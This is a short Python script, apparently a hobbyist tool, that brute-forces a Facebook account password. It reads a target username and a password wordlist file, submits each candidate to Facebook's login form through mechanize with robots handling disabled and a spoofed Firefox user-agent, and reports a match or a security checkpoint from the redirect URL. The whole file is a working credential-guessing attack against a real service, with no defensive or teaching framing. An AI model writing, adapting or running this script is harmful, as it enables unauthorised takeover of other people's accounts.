import mechanize
user =input('enter username: ')
pasw = input('enter password path: ')
passw = open(pasw , 'r').readlines()
for lines in passw:
	password = lines.strip()
	br = mechanize.Browser()
	br.set_handle_robots(False)
	br.addheaders=[('user-agent','Firefox')]
	br.open('http://facebook.com/login.php/')
	br.select_form(nr=0)
	br.form['email'] = user
	br.form['pass'] = password
	sub = br.submit()
	link=sub.geturl()
	if link == 'https://web.facebook.com/':
		print('password found '+ password)
		break
	elif link == 'https://web.facebook.com/checkpoint/?next':
		print('check point '+ password)
	else:
		print('password not found')
